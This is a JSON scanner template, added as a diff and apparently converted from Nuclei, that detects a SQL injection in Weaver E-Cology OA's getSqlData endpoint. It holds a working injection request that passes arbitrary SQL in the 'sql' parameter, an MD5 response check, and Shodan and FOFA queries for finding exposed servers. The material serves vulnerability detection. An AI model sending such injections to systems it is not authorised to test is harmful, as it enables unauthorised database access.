@@ -1,0 +1,156 @@
+{
+  "id": "weaver-ecology-getsqldata-sqli",
+  "name": "Weaver E-Cology `getsqldata` - SQL Injection",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "When the getSqlData interface of the Panwei e-cology OA system uses the mssql database, the built-in SQL statements are not spliced strictly, resulting in a SQL injection vulnerability.\n",
+  "references": [
+    "https://github.com/Wrin9/weaverOA_sql_RCE/blob/14cca7a6da7a4a81e7c7a7016cb0da75b8b290bc/weaverOA_sql_injection_POC_EXP.py#L46"
+  ],
+  "tags": [
+    "ecology",
+    "weaver",
+    "oa",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"泛微-协同办公OA\"",
+    "shodan": "ecology_JSessionid"
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql\u003dselect%20substring(sys.fn_sqlvarbasetostr(hashbytes(\u0027MD5\u0027,\u0027{{num}}\u0027)),3,32)",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{{md5(num)}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{\"api_status\":",
+            "\"status\":true}"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "weaver-ecology-getsqldata-sqli",
+    "info": {
+      "name": "Weaver E-Cology `getsqldata` - SQL Injection",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "When the getSqlData interface of the Panwei e-cology OA system uses the mssql database, the built-in SQL statements are not spliced strictly, resulting in a SQL injection vulnerability.\n",
+      "reference": [
+        "https://github.com/Wrin9/weaverOA_sql_RCE/blob/14cca7a6da7a4a81e7c7a7016cb0da75b8b290bc/weaverOA_sql_injection_POC_EXP.py#L46"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 2,
+        "shodan_query": "ecology_JSessionid",
+        "fofa_query": "app\u003d\"泛微-协同办公OA\""
+      },
+      "tags": "ecology,weaver,oa,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql\u003dselect%20substring(sys.fn_sqlvarbasetostr(hashbytes(\u0027MD5\u0027,\u0027{{num}}\u0027)),3,32)",
+          "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql\u003d"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{{md5(num)}}"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{\"api_status\":",
+              "\"status\":true}"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
